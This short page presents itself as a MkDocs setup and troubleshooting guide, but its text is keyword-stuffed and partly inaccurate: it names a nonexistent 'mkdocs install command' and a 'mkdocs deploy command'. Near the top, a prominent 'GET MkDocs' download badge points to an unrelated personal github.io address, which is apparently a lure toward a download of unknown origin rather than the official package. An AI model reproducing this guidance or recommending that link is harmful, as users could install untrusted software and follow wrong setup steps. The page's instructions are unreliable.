## Starting a MkDocs Site

Prerequisites: A computer with Python installed, access to a project folder or Git repository, and a terminal for running mkdocs install, mkdocs serve, and mkdocs build commands.

[![GET MkDocs](https://img.shields.io/badge/GET%20%E2%80%94%20MkDocs-0078D6?style=for-the-badge&logoColor=white)](https://kingcummingsjodc.github.io/.github/mkdocs-pdf)

1.  **Install the package:** Run a mkdocs install command in your chosen Python environment, then add material mkdocs, mkdocs mermaid, mkdocs pdf, or other mkdocs plugins if your documentation needs them.
2.  **Create the project:** Initialize a docs folder and mkdocs yaml configuration, then write your first pages with headings, links, code samples, and a simple mkdocs navigation structure.
3.  **Preview the site:** Start mkdocs serve to open a local browser preview, test mkdocs search, check page order, and confirm that your mkdocs theme renders content clearly.
4.  **Publish the output:** Run mkdocs build for static files, then use mkdocs deploy automation or mkdocs github pages publishing to make the documentation available to readers.

## Fixing Common MkDocs Problems

- mkdocs serve not updating? Restart the preview process, verify the watched docs folder, and confirm that the edited file is included in mkdocs navigation.
- mkdocs build failing? Check indentation in mkdocs yaml, missing page paths, unavailable mkdocs plugins, or theme settings that do not match the installed package versions.
- mkdocs search missing content? Rebuild the site, inspect excluded files, and review whether the selected mkdocs theme supports the search behavior you expect.
- mkdocs github pages not publishing? Confirm repository permissions, branch settings, CI credentials, and the exact mkdocs deploy command used by the workflow.
